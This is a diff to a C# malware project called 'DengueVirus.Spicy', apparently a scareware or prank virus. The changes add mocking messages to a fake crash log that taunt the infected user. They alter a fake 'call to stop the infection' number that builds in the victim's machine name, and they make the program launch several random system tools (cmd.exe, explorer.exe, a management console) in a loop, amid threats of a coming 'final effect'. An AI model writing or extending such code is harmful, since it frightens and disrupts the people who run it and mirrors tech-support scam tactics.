@@ -35,7 +35,11 @@ namespace DengueVirus.Spicy
                 Environment.NewLine,
                 "And trust me - Youre NOT gonna like the final one.",
                 Environment.NewLine,Environment.NewLine,
-                "- Devil Co., 2025" // should i put UltimateQ Co? Or it will be selfish?
+                "- Devil Co., 2025", // should i put UltimateQ Co? Or it will be selfish?
+                Environment.NewLine,Environment.NewLine,
+                "PS: Please try to interact with your PC while infected;",
+                Environment.NewLine,
+                "It will be fun for me to see you trying to stop me ;)"
             });
             File.WriteAllText("bsod_log.txt", contents);
             Process.Start("notepad.exe", "bsod_log.txt");
@@ -52,7 +56,7 @@ namespace DengueVirus.Spicy
             {
                 "Hello, ", Environment.UserName, ", would you like to stop the infection?",
                 Environment.NewLine,
-                "If yes, call 0800-STOP-", Environment.MachineName, " and press ", Environment.OSVersion.Version.MajorRevision.ToString(), " while on the call.",
+                "If yes, call 0800-2580-STOP-", Environment.MachineName, " and press ", Environment.OSVersion.Version.MajorRevision.ToString(), " while on the call.",
                 Environment.NewLine,
                 "You currently have only some minutes until my final effect get executed;",
                 Environment.NewLine,
@@ -74,11 +78,22 @@ namespace DengueVirus.Spicy
                 Process.Start(files[random.Next(files.Length)]);
             }*/
             // Open a random exe file from system32, from a string with its names
-            string[] files = { "notepad.exe", "calc.exe", "mspaint.exe", "cmd.exe", "explorer.exe", "write.exe" };
+            string[] files = {
+                "notepad.exe",
+                "calc.exe",
+                "mspaint.exe",
+                "cmd.exe",
+                "explorer.exe",
+                "write.exe",
+                "winver.exe",
+                "WmiMgmt.msc",
+                /*"WorkFolders.exe", enable if youre gonna test with Win10
+                "wusa.exe",
+                "xwizard.exe",*/
+            };
             Random random = new Random();
-
-            Process.Start(files[random.Next(files.Length)]);
-
+            for (int i = 0; i < 5; i++)
+                Process.Start(files[random.Next(files.Length)]);
         }
 
         public static void OpenRandomScreensaver()
